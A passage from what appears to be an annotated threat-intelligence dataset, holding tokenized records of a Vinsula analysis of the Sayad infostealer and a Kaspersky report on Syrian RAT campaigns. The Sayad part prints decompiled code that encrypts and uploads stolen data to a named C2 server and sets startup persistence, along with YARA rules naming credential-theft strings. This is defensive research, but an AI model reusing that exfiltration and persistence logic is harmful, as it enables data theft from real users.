"parent", "."], ["Name", ",", "Data", "=", "File", "."], ["ReadAllBytes(destFileName", ")", "}", ";", "dataToSerialize", "."], ["ExtraFiles", "."], ["Add(item", ")", ";", "}"], ["File", "."], ["Delete(destFileName", ")", ";"], ["}", "}", "Debug", "."], ["Write(\"skype", "ok", "\"", ")", ";", "byte"], ["[", "]", "bytetoEncrypt", "=", "ModelSerializer", "."], ["SerializeAndCompress", "(", "dataToSerialize", ")", ";"], ["Debug", "."], ["Write(\"serialize", "data", "ok", "\"", ")", ";", "byte", "[", "]", "buffer", "=", "EncryptBuffer(bytetoEncrypt", ",", "_", "keyInfo", ")", ";", "Http", "http", "=", "new", "Http", "(", ")", ";", "if", "(", "!", "http", "."], ["UploadBuffer(buffer", ",", "_", "configInfo", "."], ["BuildId", ",", "_", "configInfo", "."], ["PostURL", ")", ")"], ["{", "File", "."], ["WriteAllBytes", "(", "Path", ".", "Combine(CommonPath", "."], ["ClientStorage", "(", ")", ",", "Path", "."], ["GetRandomFileName", "(", ")", ")", ",", "buffer", ")", ";", "}", "}", "string", "startupKeyName", "=", "Resources", "."], ["StartupKeyName", ";"], ["if", "(", "!"], ["Startup", "."], ["CheckStartup(startupKeyName", ")", ")", "{", "Startup", "."], ["SetStartup(startupKeyName", ",", "Application", "."], ["ExecutablePath", ")", ";", "}", "goto", "Label_07DD", ";"], ["Label_07D4", ":", "Thread", "."], ["Sleep(-1", ")"], [";"], ["Label_07DD", ":", "flag3", "=", "true", ";", "goto", "Label_07D4", ";", "}", "catch", "(", "Exception", "exception", ")", "{", "AddExceptionToExceptionList(exception", ")", ";", "}", "}"], ["The", "Sayad", "Client", "uses", "a", "very", "trivial", "method", "for", "uploading", "the", "encrypted", "user", "and", "host", "data", "to", "the", "malicious", "server", "."], ["Here", "is", "the", "UploadBuffer", "method", "that", "uses", ".NET"], ["WebClient", "class", "to", "upload", "the", "data", "."], ["Both", "the", "Binder", "and", "the", "Sayad", "Client", "have", "been", "built", "with", "debugging", "information", "which", "reveals", "some", "details", "about", "the", "source", "code", "locations", "for", "these", "two", ".NET", "projects", "."], ["f:\\Projects\\C#\\Sayad\\Source\\Binder\\obj\\Debug\\Binder.pdb", "F:\\Projects\\C#\\Sayad\\Source\\Client\\bin\\x86\\Debug\\Client.pdb", "Network", "Activity"], ["Communication", "with", "the", "C2", "server", "is", "limited", "to", "transferring", "collected", "data", "from", "the", "user", "and", "the", "host", "to", "the", "C2", "server", "."], ["The", "stolen", "data", "being", "uploaded", "to", "the", "malicious", "server", "is", "encrypted", "first", "using", "a", "RSA", "public", "key", "which", "is", "stored", "in", "the", "malware", "configuration", "file", "."], ["The", "Sayad", "Client", "(", "DiagnosticsService.dll", ")", "implements", "an", "HTTP", "client", "that", "uploads", "the", "encrypted", "data", "to", "the", "malicious", "Web", "server", "with", "host", "name", "\u201c", "0o0o0o0o0[dot]com", "\u201d", "and", "IP", "address", "107.6.182.179", "."], ["The", "Binder", "component", "does", "n\u2019t", "implement", "any", "communication", "features", "."], ["The", "following", "is", "a", "short", "segment", "from", "Vinsula", "network", "activity", "report", "."], ["+", "WEXTRACT.exe"], ["[", "Process", "I", "d", ":", "3508", "]", "+", "~8f60957b3689075fa093b047242c0255.exe"], ["[", "Process", "I", "d", ":", "2544", "]", "+", "rundll32.exe"], ["[", "Process", "I", "d", ":", "2596", "]"], ["[", "Parent", "I", "d", ":", "2544", "]"], ["Command", "Line", ":", "rundll32.exe", "\"", "DiagnosticsService.dll\",78121", "=", ">", "TCP", "IPv4", "UNKNOWN", "192.168.64.167:1325", "<", "=", "=", ">", "107.6.182.179:80", "=", ">", "TCP", "IPv4", "UNKNOWN", "192.168.64.167:1326", "<", "=", "=", ">", "107.6.182.179:80", "=", ">", "TCP", "IPv4", "send", "192.168.64.167:1326", "=", "=", ">", "107.6.182.179:80", "=", ">", "TCP", "IPv4", "send", "192.168.64.167:1325", "=", "=", ">", "107.6.182.179:80", "=", ">", "TCP", "IPv4", "recv", "192.168.64.167:1326", "<", "=", "=", "107.6.182.179:80", "=", ">", "TCP", "IPv4", "recv", "192.168.64.167:1325", "<", "=", "=", "107.6.182.179:80", "=", ">", "TCP", "IPv4", "UNKNOWN", "192.168.64.167:1327", "<", "=", "=", ">", "107.6.182.179:80", "=", ">", "TCP", "IPv4", "send", "192.168.64.167:1327", "=", ">", "TCP", "IPv4", "recv", "192.168.64.167:1327", "<", "=", "=", "=", ">", "TCP", "IPv4", "UNKNOWN", "192.168.64.167:1328", "<", "=", "=", ">", "107.6.182.179:80", "=", ">", "TCP", "IPv4", "UNKNOWN", "192.168.64.167:1329", "<", "=", "=", ">", "107.6.182.179:80", "=", ">", "TCP", "IPv4", "send", "192.168.64.167:1328", "=", "=", ">", "107.6.182.179:80", "=", ">", "TCP", "IPv4", "send", "192.168.64.167:1329", "=", "=", ">", "107.6.182.179:80", "=", ">", "TCP", "IPv4", "recv", "192.168.64.167:1328", "<", "=", "=", "107.6.182.179:80", "=", ">", "TCP", "IPv4", "recv", "192.168.64.167:1329", "<", "=", "=", "107.6.182.179:80", "=", ">", "TCP", "IPv4", "UNKNOWN", "192.168.64.167:1330", "<", "=", "=", ">", "107.6.182.179:80", "=", ">", "TCP", "IPv4", "UNKNOWN", "192.168.64.167:1331", "<", "=", "=", ">", "107.6.182.179:80", "=", ">", "TCP", "IPv4", "send", "192.168.64.167:1330", "=", "=", ">", "107.6.182.179:80", "107.6.182.179:80", "=", "=", ">", "107.6.182.179:80", "According", "to", "the", "http://www.ipligence.com/geolocation", "service", ",", "the", "malicious", "Web", "server", "is", "located", "in", "the", "Netherlands", "."], ["Below", "is", "the", "WHOIS", "information", "for", "the", "malicious", "host", "0o0o0o0o0[dot]com", "(", "IP", "107.6.182.179", ")", "."], ["The", "domain", "was", "registered", "on", "June", "30", ",", "2014", "."], ["Interestingly", ",", "the", "registrant", ",", "admin", "and", "tech", "email", "addresses", "are", "domain@microsofts.com", "."], ["One", "wonders", "if", "the", "registrar", ",", "OnlineNIC", ",", "Inc", ",", "is", "verifying", "whether", "or", "not", "these", "are", "real", "email", "addresses", "."], ["YARA", "detection", "rule"], ["Based", "on", "the", "details", "that", "have", "been", "identified", ",", "we", "can", "create", "two", "simple", "YARA", "rules", "for", "detection", "of", "the", "Sayad", "Binder", "and", "Sayad", "Client", "."], ["Hopefully", "this", "will", "help", "other", "malware", "researchers", "and", "security", "companies", "."], ["rule", "Vinsula_Sayad_Binder", ":", "infostealer", "{", "meta", ":", "copyright", "=", "\"", "Vinsula", ",", "Inc", "\"", "description", "=", "\"", "Sayad", "Infostealer", "Binder", "\"", "version", "=", "\"", "1.0", "\"", "actor", "=", "\"", "Sayad", "Binder", "\"", "in_the_wild", "=", "true", "strings", ":", "$", "pdbstr", "=", "\"", "\\\\Projects\\\\C#\\\\Sayad\\\\Source\\\\Binder\\\\obj\\\\Debug\\\\Binder.pdb", "\"", "$", "delphinativestr", "=", "\"", "DelphiNative.dll", "\"", "nocase", "$", "sqlite3str", "=", "\"", "sqlite3.dll", "\"", "nocase", "$", "winexecstr", "=", "\"", "WinExec", "\"", "$", "sayadconfig", "=", "\"", "base.dll", "\"", "wide", "condition", ":", "all", "of", "them", "}", "rule", "Vinsula_Sayad_Client", ":", "infostealer", "{", "meta", ":", "copyright", "=", "\"", "Vinsula", ",", "Inc", "\"", "description", "=", "\"", "Sayad", "Infostealer", "Client", "\"", "version", "=", "\"", "1.0", "\"", "actor", "=", "\"", "Sayad", "Client", "\""], ["in_the_wild", "=", "true", "strings", ":", "$", "pdbstr", "=", "\"", "\\\\Projects\\\\C#\\\\Sayad\\\\Source\\\\Client\\\\bin\\\\x86\\\\Debug\\\\Client.pdb", "\"", "$", "sayadconfig", "=", "\"", "base.dll", "\"", "wide", "$", "sqlite3str", "=", "\"", "sqlite3.dll", "\"", "nocase", "$", "debugstr01", "=", "\""], ["Config", "loaded", "\"", "wide", "$", "debugstr02", "=", "\""], ["Config", "parsed", "\"", "wide", "$", "debugstr03", "=", "\"", "storage", "uploader", "\"", "wide", "$", "debugstr04", "=", "\"", "updater", "\"", "wide", "$", "debugstr05", "=", "\"", "keylogger", "\"", "wide", "$", "debugstr06", "=", "\""], ["Screenshot", "\"", "wide", "$", "debugstr07", "=", "\"", "sqlite", "found", "&", "start", "collectiong", "data", "\"", "wide", "$", "debugstr08", "=", "\"", "Machine", "info", "collected", "\"", "wide", "$", "debugstr09", "=", "\"", "browser", "ok", "\"", "wide", "$", "debugstr10", "=", "\"", "messenger", "ok", "\"", "wide", "$", "debugstr11", "=", "\"", "vpn", "ok", "\"", "wide", "$", "debugstr12", "=", "\"", "ftp", "client", "ok", "\"", "wide", "$", "debugstr13", "=", "\"", "ftp", "server", "ok", "\"", "wide", "$", "debugstr14", "=", "\"", "rdp", "ok", "\"", "wide", "$", "debugstr15", "=", "\"", "kerio", "ok", "\"", "wide", "$", "debugstr16", "=", "\"", "skype", "ok", "\"", "wide", "$", "debugstr17", "=", "\"", "serialize", "data", "ok", "\"", "wide", "$", "debugstr18", "=", "\"", "Keylogged", "\"", "wide", "condition", ":", "all", "of", "them", "}", "Tools", "used", "for", "dissecting", "Sayad", "(", "Update", "24th", "of", "July", ",", "2014", ")"], ["We", "\u2019ve", "received", "a", "request", "to", "list", "the", "tools", "used", "for", "analyzing", "Sayad", "malware", "."], ["Hope", "that", "would", "help", "other", "researchers", "."], ["Vinsula", "Execution", "Engine", "\u2013", "Kernel", "mode", "behavioral", "monitoring", "framework", "for", "32", "-", "bit", "and", "64", "-", "bit", "Windows", "http://vinsula.com/about/our-technology/", "IDA", "Pro", "\u2013", "The", "ultimate", "x64", "/", "x86", "disassembler", "and", "a", "fantastic", "debugger", "https://www.hex-rays.com/products/ida/", "WinDBG", "\u2013", "Microsoft", "Debugging", "Tools", "for", "Windows", "\u2013", "kernel", "and", "user", "mode", "debugger", "http://msdn.microsoft.com/en-au/windows/hardware/hh852365.aspx", ".NET"], ["Reflector", "\u2013", ".NET"], ["C#/MSIL", "decompiler", "and", ".NET", "debugger", "http://www.red-gate.com/products/dotnet-development/reflector/", "Dependency", "Walker", "\u2013", "provides", "a", "tree", "of", "all", "dependent", "DLLs", "and", "APIs", "http://www.dependencywalker.com/", "PEview", "\u2013", "Portable", "Executable", "Explorer", "http://www.aldeid.com/wiki/PEView", "Fiddler", "\u2013", "free", "Web", "debugging", "proxy"], ["http://www.telerik.com/fiddler"], ["SysInternals", "Process", "Explorer", "http://technet.microsoft.com/en-au/sysinternals/bb896653.aspx", "IP", "Geolocator"], ["http://www.ipligence.com/geolocation", "WHOIS", "Search", "http://www.whois.net/"], ["https://who.is/"], ["YARA", "\u2013", "The", "pattern", "matching", "swiss", "knife", "for", "malware", "researchers"], ["We", "use", "YARA", "to", "create", "the", "malware", "signatures"], ["http://plusvic.readthedocs.org/en/modules/gettingstarted.html"], ["http://plusvic.github.io/yara/", "Hashmyfiles", "by", "Nir", "Sofer", "\u2013", "Calculate", "MD5", "/", "SHA1", "/", "CRC32", "hashes", "of", "files", "http://www.nirsoft.net/utils/hash_my_files.html"], ["Summary"], ["With", "this", "particular", "sample", ",", "the", "malicious", "server", "\u2013", "as", "of", "this", "writing", "\u2013", "is", "up", "and", "running", "."], ["The", "Sayad", "malware", "does", "n\u2019t", "seem", "to", "be", "implementing", "any", "sophisticated", "mechanisms", "for", "collecting", "and", "transmitting", "the", "stolen", "data", "."], ["The", "hashes", "of", "the", "files", "related", "to", "this", "sample", "are", "copied", "below", "."], ["=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "="], ["Filename", ":", "WEXTRACT.exe", "MD5", ":", "a7813001063a23627404887b43616386", "SHA1", ":", "1c52b749403d3f229636f07b0040eb17beba28e4", "SHA-256", ":", "8904836017bc20972a769f8d4d6bee08388da3d0f83e362e67f9f0b6b1ae5c12"], ["Modified", "Time", ":", "15/07/2014", "6:17:44", "PM", "Created", "Time", ":", "17/07/2014", "10:21:15", "AM", "File", "Size", ":"], ["223,744", "File", "Version", ":", "11.00.9600.16428", "(", "winblue_gdr.131013", "-", "1700", ")", "Product", "Version", ":", "11.00.9600.16428"], ["Identical", ":", "Extension", ":", "exe", "File", "Attributes", ":", "A", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "="], ["Filename", ":", "~8f60957b3689075fa093b047242c0255.exe", "MD5", ":", "72641dedb31280b78bf6a0f184ef29b6", "SHA1", ":", "69fd05ca3a7514ea79480d1dbb358fab391e738d", "SHA-256", ":", "780c86ec885ea48316995ae69965e314a750848413f94907cf54bdeba09b5c3c", "Modified", "Time", ":", "14/07/2014", "9:53:14", "AM", "Created", "Time", ":", "19/07/2014", "12:00:58", "PM", "File", "Size", ":", "321,008", "File", "Version", ":", "1.0.0.0", "Product", "Version", ":", "1.0.0.0", "Identical", ":", "Extension", ":", "exe", "File", "Attributes", ":", "A", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "="], ["Filename", ":"], ["DiagnosticsService.dll", "MD5", ":", "432a79f8f1402cb2622b27e26e900d55", "SHA1", ":", "8521eefbf7336df5c275c3da4b61c94062fafdda", "SHA-256", ":", "bae3171917daf3eb498ae2fb1d0fcbfbb684a5314a8cbef2d5e3bd4c30ece8e1"], ["Modified", "Time", ":", "17/07/2014", "10:16:25", "AM", "Created", "Time", ":", "17/07/2014", "2:17:55", "PM", "File", "Size", ":", "150,528", "File", "Version", ":", "1.0.0.0", "Product", "Version", ":", "1.0.0.0", "Identical", ":", "Extension", ":", "dll", "File", "Attributes", ":", "A", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "="], ["Filename", ":", "sqlite3.dll", "MD5", ":", "529ecf76409537ab5ac140a5e6fec79d", "SHA1", ":", "25c3720c06de6d9b584a06ddf44c079c24df30ce", "SHA-256", ":", "c8571f963541414666397dce06657594560eed4943c93780eb7a2358f0645515", "Modified", "Time", ":", "17/07/2014", "10:16:43", "AM", "Created", "Time", ":", "17/07/2014", "2:17:55", "PM", "File", "Size", ":", "291,328", "File", "Version", ":", "Product", "Version", ":", "Identical", ":", "Extension", ":", "dll", "File", "Attributes", ":", "A", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "="], ["Filename", ":", "base.dll", "MD5", ":", "4a67b19c02d5cfdebcd85b7395d09881", "SHA1", ":", "082da03918039125dcf1f096a13ffa9ab6a56bde", "SHA-256", ":", "35cd39d419ab386aaa534b4ce95aa7fcda696ef6960fd103beaecf71bacd7398", "Modified", "Time", ":", "17/07/2014", "10:16:26", "AM", "Created", "Time", ":", "17/07/2014", "2:17:55", "PM", "File", "Size", ":", "361", "File", "Version", ":", "Product", "Version", ":", "Identical", ":", "Extension", ":", "dll", "File", "Attributes", ":", "A", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "="]]}, {"vertexSet": [[{"name": "Kaspersky Lab's Global Research & Analysis", "pos": [0, 7], "sent_id": 5, "type": "Organization"}], [{"name": "Middle East", "pos": [5, 7], "sent_id": 7, "type": "Region"}], [{"name": "Syria", "pos": [0, 1], "sent_id": 8, "type": "Country"}], [{"name": "Global Research & Analysis Team", "pos": [1, 6], "sent_id": 9, "type": "Organization"}], [{"name": "Kaspersky Lab", "pos": [10, 12], "sent_id": 9, "type": "Organization"}], [{"name": "Syria", "pos": [18, 19], "sent_id": 9, "type": "Country"}], [{"name": "social engineering", "pos": [33, 35], "sent_id": 9, "type": "Exploit"}], [{"name": "\ufe91\ufead\ufee7\ufe8e\ufee3\ufe9e \ufe8d\ufef7\ufee3\ufee5 \ufe8d\ufedf\ufeed\ufec1\ufee7\ufef2\u202c.exe", "pos": [0, 3], "sent_id": 21, "type": "Malware"}], [{"name": "\ufebf\ufe8e\ufe8b\ufea2\u202c.exe", "pos": [19, 20], "sent_id": 24, "type": "Malware"}], [{"name": "Scandals.exe", "pos": [22, 23], "sent_id": 24, "type": "Malware"}], [{"name": "MaxToCode", "pos": [34, 35], "sent_id": 24, "type": "Obfuscation"}], [{"name": "Ammazon Internet Security", "pos": [6, 9], "sent_id": 28, "type": "Malware"}], [{"name": "Kimawi.exe", "pos": [12, 13], "sent_id": 36, "type": "Malware"}], [{"name": "Kimawi.jpg", "pos": [31, 32], "sent_id": 36, "type": "File"}], [{"name": "attackers", "pos": [6, 7], "sent_id": 42, "type": "Attacker"}], [{"name": "Turkey", "pos": [0, 1], "sent_id": 46, "type": "ExploitTargetObject"}], [{"name": "Saudi Arabia", "pos": [0, 2], "sent_id": 48, "type": "ExploitTargetObject"}], [{"name": "Lebanon", "pos": [0, 1], "sent_id": 49, "type": "ExploitTargetObject"}], [{"name": "Palestine", "pos": [0, 1], "sent_id": 51, "type": "ExploitTargetObject"}], [{"name": "United Arab Emirates", "pos": [0, 3], "sent_id": 52, "type": "ExploitTargetObject"}], [{"name": "Israel", "pos": [0, 1], "sent_id": 53, "type": "ExploitTargetObject"}], [{"name": "Morocco", "pos": [0, 1], "sent_id": 54, "type": "ExploitTargetObject"}], [{"name": "France", "pos": [0, 1], "sent_id": 55, "type": "ExploitTargetObject"}], [{"name": "United States", "pos": [0, 2], "sent_id": 56, "type": "ExploitTargetObject"}], [{"name": "Trojan.MSIL.Zapchast", "pos": [6, 9], "sent_id": 65, "type": "TrojanHorse"}], [{"name": "Backdoor.Win32.Bifrose", "pos": [9, 12], "sent_id": 65, "type": "Malware"}], [{"name": "Backdoor.Win32.Fynloski", "pos": [0, 3], "sent_id": 66, "type": "Malware"}], [{"name": "Backdoor.Win32.Xtreme", "pos": [0, 3], "sent_id": 67, "type": "Malware"}]], "labels": [{"r": "P32", "h": 6, "t": 5, "evidence": [9]}, {"r": "P13", "h": 8, "t": 10, "evidence": [24]}, {"r": "P13", "h": 9, "t": 10, "evidence": [24]}, {"r": "P21", "h": 13, "t": 12, "evidence": [36]}], "title": "201408KasperskySyrianHouseOfCards", "sents": [["2016/5/2", "The", "Syrian", "Malware", "House", "of", "Cards", "-", "Securelist"], ["The", "Syrian", "Malware", "House", "of", "Cards"], ["By", "GReAT", "on", "August", "18", ",", "2014", "."], ["8:00", "am", "RESEARCH", "CYBER", "ESPIONAGE", "CYBER", "WAR", "RAT", "TROJAN", "SOCIAL", "ENGINEERING"], ["SYRIA", "GReAT"], ["Kaspersky", "Lab", "'s", "Global", "Research", "&", "Analysis", "Team", "@e_kaspersky", "/", "great"], ["Our", "full", "Report", "Introduction"], ["The", "geopolitical", "conflicts", "in", "the", "Middle", "East", "have", "deepened", "in", "the", "last", "few", "years", "."], ["Syria", "is", "no", "exception", ",", "with", "the", "crisis", "there", "taking", "many", "forms", ",", "and", "the", "cyberspace", "conflict", "is", "intensifying", "as", "sides", "try", "to", "tilt", "the", "struggle", "in", "their", "favor", "by", "exploiting", "cyber", "intelligence", "and", "using", "distortion", "."], ["The", "Global", "Research", "&", "Analysis", "Team", "(", "GReAT", ")", "at", "Kaspersky", "Lab", "has", "discovered", "new", "malware", "attacks", "in", "Syria", ",", "using", "some", "techniques", "to", "hide", "and", "operate", "malware", ",", "in", "addition", "to", "proficient", "social", "engineering", "tricks", "to", "deliver", "malware", "by", "tricking", "and", "tempting", "victims", "to", "open", "and", "launch", "malicious", "files", "."], ["The", "malware", "files", "were", "found", "on", "activist", "sites", "and", "social", "networking", "forums", ",", "some", "other", "files", "were", "also", "reported", "by", "local", "organizations", "like", "CyberArabs", "and", "Technicians", "for", "Freedom", "."], ["The", "full", "report", "detailing", "the", "attacks", "and", "related", "activities", "https://securelist.com/blog/research/66051/the-syrian-malware-house-of-cards/", "1/7", "2016/5/2"], ["The", "Syrian", "Malware", "House", "of", "Cards", "-", "Securelist", "can", "be", "found", "here", "."], ["A", "glance", "at", "what", "was", "discovered"], ["The", "number", "of", "attacks", "and", "malicious", "files", "being", "distributed", "is", "constantly", "increasing", "as", "the", "attackers", "become", "more", "organized", "and", "proficient", "."], ["The", "samples", "are", "all", "based", "on", "Remote", "Administration", "Trojan", "Tools", "(", "RATs", ")"], ["The", "number", "of", "malicious", "files", "found", ":", "110"], ["The", "number", "of", "domains", "linked", "to", "the", "attacks", ":", "20"], ["The", "number", "of", "IP", "addresses", "linked", "to", "the", "attacks", ":", "47", "The", "National", "Security", "Program", "\u2013", "what", "the", "malware", "attacks", "look", "like"], ["Masquerading", "as", "a", "reportedly", "\u201c", "Government", "leaked", "program", "\u201d", "that", "has", "the", "names", "of", "all", "wanted", "people", "in", "Syria", ",", "the", "National", "Security", "Program", "conceals", "a", "full", "featured"], ["RAT", "client", "to", "steal", "all", "sorts", "of", "information", "under", "one", "of", "its", "buttons", "."], ["\u202b\ufe91\ufead\ufee7\ufe8e\ufee3\ufe9e", "\ufe8d\ufef7\ufee3\ufee5", "\ufe8d\ufedf\ufeed\ufec1\ufee7\ufef2\u202c.exe"], ["(", "The", "national", "security", "program", ")", "Using", "shockingly", "disturbing", "videos", "to", "distribute", "malware"], ["A", "disturbing", "video", "showing", "injured", "victims", "of", "recent", "bombings", "was", "used", "on", "YouTube", "to", "appeal", "to", "people", "\u2019s", "fear", "and", "prompt", "them", "to", "download", "a", "malicious", "application", "available", "on", "a", "public", "file", "sharing", "website", "."], ["After", "initial", "https://securelist.com/blog/research/66051/the-syrian-malware-house-of-cards/", "2/7", "2016/5/2", "The", "Syrian", "Malware", "House", "of", "Cards", "-", "Securelist", "analysis", ",", "the", "file", "named", "\u201c", "\u202b\ufed3\ufebf\ufe8e\ufe8b\ufea2\u202c.exe", "\u201d", "(", "Scandals.exe", ")", "proved", "to", "be", "heavily", "obfuscated", "with", "the", "commercial", "utility", "\u201c", "MaxToCode", "\u201d", "for", ".NET"], ["in", "order", "to", "avoid", "early", "detection", "by", "antivirus", "solutions", "."], ["Did", "you", "install", "your", "\u201c", "Ammazon", "\u201d", "Security", "Suite", "?"], ["If", "you", "thought", "the", "era", "of", "fake", "antiviruses", "was", "over", ",", "here", "comes", "this", "newly", "developed", "Syrian", "sample", "to", "challenge", "your", "beliefs", "."], ["With", "the", "innocent", "title", "of", "\u201c", "Ammazon", "Internet", "Security", "\u201d", ",", "this", "malicious", "application", "tries", "to", "mimic", "a", "security", "scanner", ",", "even", "including", "a", "quite", "thorough", "graphical", "user", "interface", "and", "some", "interactive", "functionality", "."], ["Your", "\u201c", "Ammazon", "\u201d", "is", "now", "secure", ",", "what", "about", "the", "rest", "of", "your", "network", "?"], ["Total", "Network", "Monitor", "(", "which", "is", "a", "legitimate", "application", ")", "is", "inside", "another", "sample", "found", ",", "being", "used", "with", "embedded", "malware", "for", "spying", "purposes", "."], ["Offering", "security", "applications", "to", "protect", "against", "surveillance", "is", "one", "of", "the", "many", "techniques", "used", "by", "malware", "writing", "groups", "to", "get", "users", "desperate", "for", "privacy", "to", "execute", "these", "dubious", "https://securelist.com/blog/research/66051/the-syrian-malware-house-of-cards/", "3/7", "2016/5/2", "The", "Syrian", "Malware", "House", "of", "Cards", "-", "Securelist", "programs", "."], ["Instant", "messaging", ",", "instant", "infection"], ["It", "\u2019s", "also", "the", "case", "with", "other", "samples", ",", "where", "social", "engineering", "does", "all", "the", "heavy", "work", "."], ["Instant", "messaging", "applications", "for", "desktop", "operating", "systems", "have", "been", "used", "in", "the", "past", "to", "spread", "malware", "and", "it", "seems", "Syrian", "malware", "authors", "have", "jumped", "on", "the", "bandwagon", "."], ["Beware", "of", "Chemical", "Attacks"], ["Another", "of", "the", "attacks", "using", "social", "engineering", "tricks", ",", "the", "sample", "named", "Kimawi.exe", "(", "Arabic", "for", "Chemicals", ")", "with", "a", "JPG", "icon", ",", "is", "a", "RAT", "file", "bound", "to", "the", "image", "Kimawi.jpg", "."], ["The", "picture", "is", "a", "previously", "leaked", "paper", "supposedly", "from", "the", "regime", "in", "Syria", "warning", "military", "units", "to", "prepare", "for", "Chemical", "Attacks", "."], ["The", "file", "is", "being", "sent", "by", "email", "to", "selected", "victims", "."], ["https://securelist.com/blog/research/66051/the-syrian-malware-house-of-cards/", "4/7", "2016/5/2", "The", "Syrian", "Malware", "House", "of", "Cards", "-", "Securelist", "FAQ"], ["What", "is", "new", "?"], ["The", "threat", "actors", "are", "becoming", "more", "organized", ",", "the", "number", "of", "attacks", "is", "increasing", "and", "the", "samples", "being", "used", "are", "becoming", "more", "sophisticated", ",", "while", "also", "relying", "extensively", "on", "powerful", "social", "engineering", "tricks", "that", "many", "people", "fall", "for", "."], ["Where", "are", "the", "victims", "and", "the", "attackers", "?"], ["The", "victims", "infected", "when", "accessing", "the", "hacked", "forums", "and", "social", "networking", "sites", "tend", "to", "be", "ordinary", "users", "or", "activistshey", "were", ",", "or", "specific", "targets", "if", "they", "receive", "the", "malware", "via", "email", ",", "Skype", ",", "or", "messages", "on", "social", "networking", "sites", "."], ["The", "victims", "are", "also", "located", "outside", "Syria", "."], ["We", "have", "seen", "victims", "of", "Syrian\u00adbased", "malware", "in", ":", "1", "."], ["Turkey"], ["2", "."], ["Saudi", "Arabia", "3", "."], ["Lebanon"], ["4", "."], ["Palestine", "5", "."], ["United", "Arab", "Emirates", "6", "."], ["Israel", "7", "."], ["Morocco", "https://securelist.com/blog/research/66051/the-syrian-malware-house-of-cards/", "5/7", "2016/5/2", "The", "Syrian", "Malware", "House", "of", "Cards", "-", "Securelist", "8", "."], ["France", "9", "."], ["United", "States"], ["The", "attackers", "\u2019", "command", "and", "control", "centers", "were", "tracked", "to", "IP", "addresses", "in", "Syria", ",", "Russia", ",", "Lebanon", ",", "the", "US", "and", "Brazil", "."], ["How", "many", "have", "fallen", "victim", "?"], ["We", "believe", "the", "number", "of", "victims", "exceeds", "10,000", ",", "with", "some", "of", "the", "files", "being", "downloaded", "more", "than", "2000", "times", "."], ["The", "attackers", "\u2019", "malware", "samples", "and", "variations", "have", "increased", "dramatically", "from", "only", "a", "few", "in", "Q1", "2013", "to", "around", "40", "in", "Q2", "2014", "."], ["What", "is", "the", "impact", "on", "victims", "?"], ["Remote", "Administration", "Trojans", "tools", "are", "used", "to", "fully", "compromise", "the", "system", "on", "victim", "devices", "."], ["RATs", "are", "capable", "of", "stealing", "user", "credentials", "in", "addition", "to", "activating", "camera", "and", "microphone", "functionalities", "\u2026", "Are", "users", "protected", "?"], ["Kaspersky", "detects", "and", "blocks", "all", "the", "samples", "that", "have", "been", "found", "."], ["They", "are", "detected", "as", "follows", ":", "Trojan", ".", "MSIL.Zapchast", "Backdoor", ".", "Win32.Bifrose"], ["Backdoor", ".", "Win32.Fynloski"], ["Backdoor", ".", "Win32.Xtreme"], ["More", "details", "and", "analysis", "of", "the", "attacks", "and", "malware", "samples", "can", "be", "found", "in", "the", "full", "report", "here", "."], ["Further", "reading"], ["If", "you", "\u2019d", "like", "to", "read", "more", "on", "the", "subject", ",", "CitizenLab", "and", "EFF", "have", "published", "several", "other", "good", "analyses", "of", "related", "malware", "and", "attacks", ":"], ["https://securelist.com/blog/research/66051/the-syrian-malware-house-of-cards/", "6/7", "2016/5/2", "The", "Syrian", "Malware", "House", "of", "Cards", "-", "Securelist"], ["The", "Internet", "is", "Back", "in", "Syria", "and", "So", "is", "Malware"], ["Targeting", "Syrian", "Activists"], ["A", "Call", "to", "Harm", ":", "New", "Malware", "Attacks", "Target", "the", "Syrian", 